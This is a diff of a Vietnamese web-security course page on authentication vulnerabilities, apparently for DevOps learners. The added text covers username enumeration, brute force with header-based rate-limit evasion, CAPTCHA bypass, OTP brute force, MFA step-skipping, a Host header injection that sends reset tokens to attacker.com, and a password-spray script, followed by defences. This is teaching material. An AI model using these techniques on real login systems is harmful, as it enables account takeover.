@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chương 4: Authentication — Hieu Nguyen</title>
-  <meta name="description" content="Authentication cho DevOps: enumeration, MFA, reset password, lockout, và log.">
+  <title>Chương 4: Authentication — Lỗ hổng xác thực — Hieu Nguyen</title>
+  <meta name="description" content="Chương 4: Authentication — Lỗ hổng xác thực — Web Security notes.">
   <link rel="icon" href="../../../favicon.svg" type="image/svg+xml">
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Outfit:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -40,86 +40,372 @@
         <span>›</span>
         <span>04. Authentication</span>
       </div>
-      <h1>Chương 4: Authentication</h1>
-      <p class="lede">Login sai không phải “user ngu”. Đó là control bạn chưa siết.</p>
-      <div class="docs-meta">
-        <span><strong>Tác giả:</strong> Hieu Nguyen (Ryan)</span>
-        <span><strong>Phần:</strong> II — Auth</span>
-        <span><strong>Cập nhật:</strong> Aug 2026</span>
-      </div>
-      <h2 id="khai-niem">Khái niệm</h2>
-<p>Authentication trả lời <strong>bạn là ai</strong>. Authorization trả lời <strong>bạn được làm gì</strong>. Nhầm hai thứ này thì 401/403, MFA, và RBAC đều đặt sai chỗ.</p>
-<h2 id="hoat-dong">Cách hoạt động</h2>
-<p>User gửi chứng cứ (password, OTP, WebAuthn, federated token) → server kiểm tra → phát session hoặc JWT. Mọi bước sau login đều giả định bước này đúng.</p>
-<h2 id="lo-hong">Các lớp lỗ hổng thường gặp</h2>
-<h3 id="enum">Username / email enumeration</h3>
-<p>Message khác nhau (“user không tồn tại” vs “sai mật khẩu”), thời gian response khác nhau, hoặc reset-password tiết lộ account. Attacker chỉ cần danh sách email đã leak.</p>
-<h3 id="brute">Đoán mật khẩu và lockout giả</h3>
-<p>Không rate-limit, lockout chỉ theo username (đổi IP/username là né), CAPTCHA chỉ trên UI không trên API. Password spray: một mật khẩu yếu trên nhiều tài khoản — log trông “thưa” hơn brute một user.</p>
-<h3 id="mfa">MFA làm cho có</h3>
-<p>OTP gửi cùng response login, MFA cookie không bind device, backup code không rotate, “remember this device” sống hàng năm. Bypass thường ở <em>nhánh phụ</em> (reset, OAuth, API cũ) chứ không phải form login chính.</p>
-<h3 id="reset">Password reset</h3>
-<p>Token ngắn, một lần, hết hạn; Host header không được dùng để ghép link (Chương 2). Token trong URL thì access log giữ secret.</p>
-<h3 id="remember">Remember me</h3>
-<p>Selector + verifier hashed phía server; đừng để token login thuần trong cookie dài hạn.</p>
-<h2 id="phat-hien">Cách phát hiện</h2>
+      <div id="top"></div>
+<header><h1>Chương 4: Authentication — Lỗ hổng xác thực</h1></header>
+<h2 id="khái-niệm">Khái niệm</h2>
+<p><strong>Authentication</strong> (Xác thực) là quá trình xác minh danh tính — trả lời câu hỏi &quot;Bạn là ai?&quot;. Không nhầm với <strong>Authorization</strong> (Phân quyền) — &quot;Bạn được phép làm gì?&quot;.</p>
+<p><strong>Mức độ nguy hiểm:</strong> Cao — Bypass authentication = truy cập toàn bộ tài khoản.</p>
+<p>Lỗ hổng authentication xảy ra khi:</p>
 <ul>
-        <li>So response login fail: status, length, thời gian.</li>
-        <li>API /login và /forgot-password có cùng policy rate-limit không.</li>
-        <li>Audit: MFA bắt buộc nhóm admin chưa.</li>
-      </ul>
-<h2 id="phong">Phòng chống</h2>
+<li>Logic xác thực bị lỗi</li>
+<li>Implementation sai spec</li>
+<li>Thiếu rate limiting</li>
+<li>Weak credentials được phép tồn tại</li>
+</ul>
+<hr>
+<h2 id="cách-hoạt-động">Cách hoạt động</h2>
+<p>Ba yếu tố xác thực (authentication factors):</p>
 <ul>
-        <li>Thông báo lỗi login chung.</li>
-        <li>Rate-limit + backoff theo IP và account; alert spray.</li>
-        <li>MFA phishing-resistant (WebAuthn) cho privileged.</li>
-        <li>Reset: token random, TTL ngắn, invalidate session cũ.</li>
-        <li>Password: check denylist / leak, không tự roll hash yếu.</li>
-      </ul>
-<h2 id="devops">Góc nhìn DevOps</h2>
-<p>IdP (Keycloak, Cognito, Entra) tập trung policy. WAF rate-limit là lớp phụ. Secret SMTP/SMS cho OTP nằm Vault, không env Pod. Log auth event (success/fail/MFA/reset) đủ field nhưng không log password.</p>
-<h2 id="tom-tat">Tóm tắt</h2>
-<ul>
-        <li>Auth ≠ authz.</li>
-        <li>Enumeration và reset là lỗ hay hơn “bẻ hash”.</li>
-        <li>MFA phải phủ mọi nhánh login.</li>
-        <li>DevOps: IdP, rate-limit, log, secret kênh OTP.</li>
-      </ul>
-<h2 id="on-tap">Câu hỏi ôn tập</h2>
-<ol>
-        <li>Vì sao message login khác nhau thành lỗ?</li>
-        <li>Lockout theo username thất bại thế nào trước password spray?</li>
-        <li>Reset password lấy Host từ request thì rủi ro gì?</li>
-        <li>Remember-me cookie nên chứa gì, không chứa gì?</li>
-        <li>API login có CAPTCHA UI nhưng không có throttle — hệ quả?</li>
-      </ol>
+<li><strong>Something you know:</strong> Password, PIN, security questions</li>
+<li><strong>Something you have:</strong> OTP device, authenticator app, hardware key</li>
+<li><strong>Something you are:</strong> Fingerprint, face recognition, voice</li>
+</ul>
+<p><strong>MFA</strong> (Multi-Factor Authentication — Xác thực đa yếu tố) = kết hợp ≥2 yếu tố.</p>
+<hr>
+<h2 id="các-loại-lỗ-hổng-authentication">Các loại lỗ hổng Authentication</h2>
+<h3 id="1-username-enumeration">1. Username Enumeration</h3>
+<p><strong>Vấn đề:</strong> App trả về thông báo khác nhau cho username tồn tại và không tồn tại.</p>
+<pre><code class="language-http">POST /login HTTP/1.1
 
-      <div class="docs-tags">
-        <span class="docs-tag">auth</span>
-        <span class="docs-tag">mfa</span>
-        <span class="docs-tag">owasp</span>
-      </div>
+username=valid_user&amp;password=wrong
+→ Response: &quot;Incorrect password&quot;     ← username tồn tại
+
+username=invalid_user&amp;password=wrong
+→ Response: &quot;Username not found&quot;     ← username không tồn tại
+</code></pre>
+<p>Hacker có thể dùng Intruder để enumerate toàn bộ username hợp lệ.</p>
+<p><strong>Các dấu hiệu leak username:</strong></p>
+<ul>
+<li>Response body khác nhau</li>
+<li>HTTP status code khác nhau</li>
+<li>Response time khác nhau (database lookup vs. instant reject)</li>
+</ul>
+<p><strong>Phòng chống:</strong></p>
+<pre><code class="language-text">❌ &quot;Username not found&quot;
+❌ &quot;Incorrect password&quot;
+✓  &quot;Invalid credentials&quot;  ← luôn dùng cùng một message
+</code></pre>
+<h3 id="2-brute-force-password">2. Brute Force Password</h3>
+<p><strong>Điều kiện khai thác:</strong> Không có rate limiting, không có account lockout, password yếu.</p>
+<pre><code class="language-text">Dùng Burp Intruder:
+POST /login
+username=admin&amp;password=§payload§
+
+Wordlist: rockyou.txt (14 triệu passwords phổ biến)
+</code></pre>
+<p><strong>Bypass các cơ chế bảo vệ:</strong></p>
+<pre><code class="language-text">Rate limiting by IP → Dùng X-Forwarded-For header:
+X-Forwarded-For: 1.2.3.4  (thay đổi mỗi request)
+
+Account lockout → Thử nhiều usernames (password spray):
+Dùng 1 password phổ biến (Password123!) với nhiều username khác nhau
+
+CAPTCHA → Dùng 2captcha.com API để bypass tự động
+</code></pre>
+<p><strong>Ví dụ bypass rate limit bằng header:</strong></p>
+<pre><code class="language-http">POST /login HTTP/1.1
+X-Forwarded-For: §1.2.3.§4    ← Intruder thay đổi IP
+
+username=admin&amp;password=password123
+</code></pre>
+<h3 id="3-broken-brute-force-protection">3. Broken Brute Force Protection</h3>
+<p><strong>Lỗi logic điển hình:</strong></p>
+<pre><code class="language-text">Scenario 1: Counter reset khi login thành công
+→ Gửi request: wrong, wrong, correct → counter reset
+→ Gửi: wrong, wrong, wrong (lại)...
+→ Bao giờ cũng còn 2 lần thử trước khi lockout
+
+Scenario 2: Lockout chỉ áp dụng cho IP
+→ Dùng nhiều IP (botnet, proxy)
+
+Scenario 3: Counter đếm theo session
+→ Tạo session mới sau mỗi vài lần thử
+</code></pre>
+<h3 id="4-flawed-multi-factor-authentication">4. Flawed Multi-Factor Authentication</h3>
+<p><strong>MFA Bypass qua URL manipulation:</strong></p>
+<pre><code class="language-text">Flow bình thường:
+1. POST /login → success → redirect /mfa-verify
+2. POST /mfa-verify?code=123456 → success → redirect /dashboard
+
+Bypass:
+1. POST /login với valid credentials
+2. Bỏ qua /mfa-verify → trực tiếp truy cập /dashboard
+→ Nếu app chỉ kiểm tra bước 1, MFA bị bypass
+</code></pre>
+<p><strong>MFA Bypass qua Brute Force OTP:</strong></p>
+<pre><code class="language-text">Nếu 6-digit OTP không có rate limiting:
+Có 1,000,000 tổ hợp → có thể brute force
+
+Dùng Intruder với payload 000000-999999
+</code></pre>
+<p><strong>Bypass bằng response manipulation:</strong></p>
+<pre><code class="language-http">POST /mfa-verify HTTP/1.1
+
+code=000000
+
+Response: {&quot;success&quot;: false, &quot;redirect&quot;: &quot;/mfa-verify&quot;}
+
+→ Sửa response thành:
+{&quot;success&quot;: true, &quot;redirect&quot;: &quot;/dashboard&quot;}
+
+→ App đọc response từ client và redirect
+</code></pre>
+<h3 id="5-flawed-password-reset">5. Flawed Password Reset</h3>
+<p><strong>Email enumeration qua reset:</strong></p>
+<pre><code class="language-text">POST /forgot-password
+email=victim@example.com
+→ &quot;If this email exists, we&#x27;ll send a reset link&quot;  ← đúng
+
+Nhưng một số app:
+→ &quot;Email sent!&quot;    ← email tồn tại
+→ &quot;Email not found&quot; ← email không tồn tại
+</code></pre>
+<p><strong>Weak reset token:</strong></p>
+<pre><code class="language-text">Reset link: /reset?token=1234567890
+→ Token là timestamp? → predictable
+→ Token là MD5(email)? → crackable
+→ Token quá ngắn? → brute force được
+
+Đúng: Token là 32+ bytes cryptographically random
+</code></pre>
+<p><strong>Host Header Injection trong reset email:</strong></p>
+<pre><code class="language-http">POST /forgot-password HTTP/1.1
+Host: attacker.com    ← thay đổi
+
+email=victim@example.com
+</code></pre>
+<pre><code class="language-text">Email gửi đến victim:
+&quot;Click here to reset: https://attacker.com/reset?token=abc123&quot;
+
+Victim click → token bị capture
+</code></pre>
+<h3 id="6-keeping-users-logged-in--remember-me">6. Keeping Users Logged In — Remember Me</h3>
+<p><strong>Weak remember-me token:</strong></p>
+<pre><code class="language-text">Token: base64(username + &quot;:&quot; + MD5(password))
+→ Decode được username
+→ Crack MD5 → có password
+
+Token: base64(&quot;admin:e10adc3949ba59abbe56e057f20f883e&quot;)
+→ Decode: admin:e10adc3949ba59abbe56e057f20f883e
+→ MD5 crack: 123456
+</code></pre>
+<p><strong>Phòng chống:</strong> Token phải là random, không chứa thông tin user, lưu hash trong database.</p>
+<hr>
+<h2 id="ví-dụ-thực-tế-password-spray-attack">Ví dụ thực tế: Password Spray Attack</h2>
+<p><strong>Tình huống:</strong> Công ty có 500 nhân viên, dùng email làm username, không có lockout sau nhiều lần thử sai.</p>
+<pre><code class="language-python"># Script minh họa (không dùng trái phép)
+usernames = [&quot;user1@company.com&quot;, &quot;user2@company.com&quot;, ...]
+common_passwords = [&quot;Company2024!&quot;, &quot;Welcome1!&quot;, &quot;Password123!&quot;]
+
+for password in common_passwords:
+    for username in usernames:
+        response = login(username, password)
+        if response.status == 200:
+            print(f&quot;Found: {username}:{password}&quot;)
+        time.sleep(1)  # Avoid rate limiting
+</code></pre>
+<hr>
+<h2 id="kịch-bản-tấn-công-bypass-mfa">Kịch bản tấn công: Bypass MFA</h2>
+<pre><code class="language-text">Target: Ứng dụng banking với SMS OTP
+
+1. Attacker có username/password của victim (từ data breach)
+2. POST /login → success → server send OTP đến phone victim
+3. Attacker không có OTP
+
+Khai thác:
+4. Attacker kiểm tra: /dashboard có kiểm tra session state không?
+5. Truy cập trực tiếp /dashboard với session cookie từ bước 2
+6. Nếu app chỉ set &quot;authenticated=true&quot; sau login, chưa set &quot;mfa_verified=true&quot;
+→ MFA hoàn toàn bị bypass
+</code></pre>
+<hr>
+<h2 id="cách-phát-hiện">Cách phát hiện</h2>
+<p>Checklist nhận biết lỗ hổng authentication:</p>
+<pre><code class="language-text">□ App trả về message khác nhau cho valid/invalid username
+□ Không có rate limiting (test: 100 requests liên tiếp)
+□ Không có account lockout
+□ CAPTCHA dễ bypass hoặc không có
+□ MFA OTP không có expiry hoặc rate limit
+□ Reset password token predictable
+□ Reset link dùng Host header từ request
+□ Remember-me token chứa thông tin user
+□ Password policy quá yếu (không có complexity requirement)
+□ Default credentials chưa đổi (admin/admin, admin/password)
+</code></pre>
+<hr>
+<h2 id="phòng-chống">Phòng chống</h2>
+<h3 id="passwords">Passwords</h3>
+<pre><code class="language-python"># Enforce strong password policy
+def validate_password(password):
+    if len(password) &lt; 12:
+        return False
+    if not re.search(r&#x27;[A-Z]&#x27;, password):
+        return False
+    if not re.search(r&#x27;[0-9]&#x27;, password):
+        return False
+    if not re.search(r&#x27;[^a-zA-Z0-9]&#x27;, password):
+        return False
+    return True
+
+# Hash passwords với bcrypt/argon2 (KHÔNG dùng MD5/SHA1)
+import bcrypt
+hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
+</code></pre>
+<h3 id="rate-limiting-và-lockout">Rate Limiting và Lockout</h3>
+<pre><code class="language-python"># Rate limiting: max 5 lần thử / 15 phút / IP+username
+@app.route(&#x27;/login&#x27;, methods=[&#x27;POST&#x27;])
+def login():
+    key = f&quot;login:{request.remote_addr}:{request.form[&#x27;username&#x27;]}&quot;
+    attempts = redis.incr(key)
+    
+    if attempts == 1:
+        redis.expire(key, 900)  # 15 phút
+    
+    if attempts &gt; 5:
+        return jsonify({&quot;error&quot;: &quot;Too many attempts&quot;}), 429
+    
+    # ... actual login logic
+</code></pre>
+<h3 id="mfa-đúng-cách">MFA đúng cách</h3>
+<pre><code class="language-python"># Session state machine cho MFA
+def login():
+    # Bước 1: Verify credentials
+    if not verify_credentials(username, password):
+        return error(&quot;Invalid credentials&quot;)
+    
+    # Set state: credentials verified, waiting for MFA
+    session[&#x27;auth_state&#x27;] = &#x27;awaiting_mfa&#x27;
+    session[&#x27;pending_user_id&#x27;] = user.id
+    return redirect(&#x27;/mfa-verify&#x27;)
+
+def mfa_verify():
+    # Kiểm tra state trước khi cho phép verify MFA
+    if session.get(&#x27;auth_state&#x27;) != &#x27;awaiting_mfa&#x27;:
+        return redirect(&#x27;/login&#x27;)  # Không bypass được
+    
+    if verify_otp(session[&#x27;pending_user_id&#x27;], request.form[&#x27;code&#x27;]):
+        session[&#x27;auth_state&#x27;] = &#x27;authenticated&#x27;
+        session[&#x27;user_id&#x27;] = session.pop(&#x27;pending_user_id&#x27;)
+        return redirect(&#x27;/dashboard&#x27;)
+</code></pre>
+<h3 id="password-reset-an-toàn">Password Reset an toàn</h3>
+<pre><code class="language-python">import secrets
+
+def generate_reset_token():
+    # 32 bytes = 256-bit entropy
+    return secrets.token_urlsafe(32)
+
+def forgot_password(email):
+    # Không leak thông tin về email tồn tại hay không
+    user = User.find_by_email(email)
+    if user:
+        token = generate_reset_token()
+        store_reset_token(user.id, token, expires_in=3600)
+        send_reset_email(user.email, token)
+    
+    # Luôn trả về cùng response
+    return {&quot;message&quot;: &quot;If this email exists, a reset link was sent&quot;}
+
+def reset_password(token, new_password):
+    # Dùng constant-time comparison để tránh timing attacks
+    user_id = get_user_by_token(token)
+    if not user_id:
+        return error(&quot;Invalid token&quot;)
+    
+    # Invalidate token sau khi dùng
+    delete_reset_token(token)
+    update_password(user_id, new_password)
+</code></pre>
+<hr>
+<h2 id="góc-nhìn-devops">Góc nhìn DevOps</h2>
+<p><strong>Cấu hình Nginx rate limiting:</strong></p>
+<pre><code class="language-nginx"># Rate limit login endpoint
+limit_req_zone $binary_remote_addr zone=login:10m rate=5r/m;
+
+location /api/login {
+    limit_req zone=login burst=10 nodelay;
+    limit_req_status 429;
+    proxy_pass http://backend;
+}
+</code></pre>
+<p><strong>Kubernetes: Không hardcode credentials:</strong></p>
+<pre><code class="language-yaml"># ❌ SAI: hardcode trong env
+env:
+  - name: ADMIN_PASSWORD
+    value: &quot;admin123&quot;
+
+# ✓ ĐÚNG: dùng Secret
+env:
+  - name: ADMIN_PASSWORD
+    valueFrom:
+      secretKeyRef:
+        name: app-credentials
+        key: admin-password
+</code></pre>
+<p><strong>Monitoring failed logins:</strong></p>
+<pre><code class="language-yaml"># Alertmanager rule: nhiều failed login = brute force attack
+- alert: BruteForceDetected
+  expr: sum(rate(http_requests_total{path=&quot;/api/login&quot;,status=&quot;401&quot;}[5m])) &gt; 20
+  for: 2m
+  labels:
+    severity: warning
+  annotations:
+    summary: &quot;Possible brute force on login endpoint&quot;
+</code></pre>
+<p><strong>Password manager cho team:</strong></p>
+<ul>
+<li>HashiCorp Vault cho service accounts</li>
+<li>1Password Teams / Bitwarden cho nhân viên</li>
+<li>Không bao giờ share password qua Slack/email</li>
+</ul>
+<hr>
+<h2 id="tóm-tắt">Tóm tắt</h2>
+<ul>
+<li>Authentication errors thường do logic lỗi, không phải crypto phức tạp.</li>
+<li>Username enumeration là bước đầu tiên — đừng leak thông tin.</li>
+<li>Rate limiting và lockout là must-have, không phải nice-to-have.</li>
+<li>MFA cần có session state machine — không phải chỉ &quot;nếu có OTP thì pass&quot;.</li>
+<li>Password reset token phải random, có expiry, dùng 1 lần.</li>
+<li>Hash passwords bằng bcrypt/argon2 với salt, không bao giờ MD5/SHA1.</li>
+<li>Default credentials phải đổi ngay sau khi deploy.</li>
+</ul>
+<hr>
+<h2 id="câu-hỏi-ôn-tập">Câu hỏi ôn tập</h2>
+<ol>
+<li>Sự khác biệt giữa username enumeration và brute force là gì? Tại sao cả hai đều nguy hiểm?</li>
+<li>Mô tả cách bypass MFA nếu ứng dụng không có session state machine.</li>
+<li>Tại sao MD5 không phải là cách hash password an toàn? Nên dùng gì thay thế?</li>
+<li>Làm thế nào để implement rate limiting cho login endpoint mà không ảnh hưởng đến UX?</li>
+<li>Host Header Injection trong password reset hoạt động như thế nào?</li>
+</ol>
       <div class="docs-pager">
-        <a href="../03-burp/">Previous · 03. Burp</a>
+        <a href="../03-burp/">Previous · 03. Burp Suite</a>
         <a href="../05/">Next · 05. Session</a>
       </div>
     </article>
     <aside class="docs-toc">
       <div class="docs-toc-title">On this page</div>
       <nav>
-        <a href="#khai-niem">Khái niệm</a>
-        <a href="#hoat-dong">Cách hoạt động</a>
-        <a href="#lo-hong">Các lớp lỗ hổng thường gặp</a>
-        <a class="depth-3" href="#enum">Username / email enumeration</a>
-        <a class="depth-3" href="#brute">Đoán mật khẩu và lockout giả</a>
-        <a class="depth-3" href="#mfa">MFA làm cho có</a>
-        <a class="depth-3" href="#reset">Password reset</a>
-        <a class="depth-3" href="#remember">Remember me</a>
-        <a href="#phat-hien">Cách phát hiện</a>
-        <a href="#phong">Phòng chống</a>
-        <a href="#devops">Góc nhìn DevOps</a>
-        <a href="#tom-tat">Tóm tắt</a>
-        <a href="#on-tap">Câu hỏi ôn tập</a>
+        <a href="#khái-niệm">Khái niệm</a>
+        <a href="#cách-hoạt-động">Cách hoạt động</a>
+        <a href="#các-loại-lỗ-hổng-authentication">Các loại lỗ hổng Authentication</a>
+        <a class="depth-3" href="#1-username-enumeration">1. Username Enumeration</a>
+        <a class="depth-3" href="#2-brute-force-password">2. Brute Force Password</a>
+        <a class="depth-3" href="#3-broken-brute-force-protection">3. Broken Brute Force Protection</a>
+        <a class="depth-3" href="#4-flawed-multi-factor-authentication">4. Flawed Multi-Factor Authentication</a>
+        <a class="depth-3" href="#5-flawed-password-reset">5. Flawed Password Reset</a>
+        <a class="depth-3" href="#6-keeping-users-logged-in--remember-me">6. Keeping Users Logged In — Remember Me</a>
+        <a href="#ví-dụ-thực-tế-password-spray-attack">Ví dụ thực tế: Password Spray Attack</a>
+        <a href="#kịch-bản-tấn-công-bypass-mfa">Kịch bản tấn công: Bypass MFA</a>
+        <a href="#cách-phát-hiện">Cách phát hiện</a>
+        <a href="#phòng-chống">Phòng chống</a>
+        <a class="depth-3" href="#passwords">Passwords</a>
+        <a class="depth-3" href="#rate-limiting-và-lockout">Rate Limiting và Lockout</a>
+        <a class="depth-3" href="#mfa-đúng-cách">MFA đúng cách</a>
+        <a class="depth-3" href="#password-reset-an-toàn">Password Reset an toàn</a>
+        <a href="#góc-nhìn-devops">Góc nhìn DevOps</a>
+        <a href="#tóm-tắt">Tóm tắt</a>
+        <a href="#câu-hỏi-ôn-tập">Câu hỏi ôn tập</a>
       </nav>
     </aside>
   </div>
